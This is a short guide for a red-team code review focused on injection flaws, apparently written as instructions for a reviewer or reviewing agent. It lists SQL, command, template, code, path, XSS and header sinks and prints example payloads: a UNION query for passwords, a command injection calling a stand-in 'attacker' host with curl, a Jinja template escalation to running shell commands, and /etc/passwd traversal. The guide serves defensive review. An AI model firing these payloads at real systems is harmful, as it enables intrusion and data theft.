# Red-team sub-lens: injection

Hunt untrusted data reaching an interpreter without safe separation. For each finding, name the exact
payload and trace source → sink at `file:line`. A CONFIRMED injection reaching a sink = `fail`.

**Sinks to trace:**
- **SQL / NoSQL** — string-built queries, f-string/format/`+` into SQL, ORM `raw()`/`.extra()`, Mongo
  `$where`/`$regex`, dynamic `ORDER BY` / table names that bound params can't cover.
- **OS command** — `os.system`, `subprocess(..., shell=True)`, backticks, `child_process.exec`, arg arrays
  still routed through a shell.
- **Template (SSTI)** — user data into Jinja / Twig / Freemarker / Velocity / EL, `render_template_string`.
- **Code** — `eval` / `exec` / `Function`, dynamic `import`/`require` on tainted input.
- **Path / file** — user-controlled path joins, `../` traversal, zip-slip, symlink following.
- **Output / XSS** — `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, unescaped template output; missing encoding.
- **Header / log / CRLF** — user input into HTTP headers, `Location`, log lines (log forging).

**Build the payload, don't hand-wave:**
- SQLi: `q = ' UNION SELECT password FROM users-- -` at the concatenation line; note first- vs second-order.
- Command: `; curl http://attacker/$(id) #` (or `$(id)`) reaching `shell=True`.
- SSTI: `{{7*7}}` to confirm, then `{{cycler.__init__.__globals__.os.popen('id').read()}}` to escalate (Jinja).
- Path: `filename=../../../../etc/passwd`; zip entry `../../evil.sh`.

For each tainted source, state what the attacker fully controls vs. what is server-fixed — the exploit lives
in the controlled bytes. A removed/loosened sanitizer, or a reintroduced previously-patched injection, is
itself a finding.
